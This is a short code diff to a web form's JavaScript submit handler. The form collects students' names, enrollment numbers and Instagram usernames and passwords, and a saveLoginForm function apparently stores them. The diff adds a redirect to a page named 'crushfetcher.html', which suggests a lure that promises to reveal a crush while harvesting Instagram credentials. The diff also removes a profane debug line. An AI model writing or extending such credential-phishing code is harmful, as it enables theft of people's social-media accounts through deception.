@@ -21,7 +21,7 @@
     document.getElementById("contactForm").addEventListener('submit',submitForm);
 
       function submitForm(e){
-        alert('Saved');
+        
         e.preventDefault();
 
 
@@ -33,9 +33,12 @@
         var instagram = getElementVal('Instagram');
         var password = getElementVal('Password');
 
-        console.log("fuck");
+        
          
         saveLoginForm(fullName,enrollmentNumber,branch,year,gender,instagram,password);
+        window.location.href = `crushfetcher.html?gender=${gender}`;
+        alert('Saved');
+        
 
         document.getElementById('contactForm').reset();
 
@@ -59,6 +62,7 @@
               console.error("Error saving data:", error);
           } else {
               console.log("Data saved successfully.");
+              
           }})
       }
 
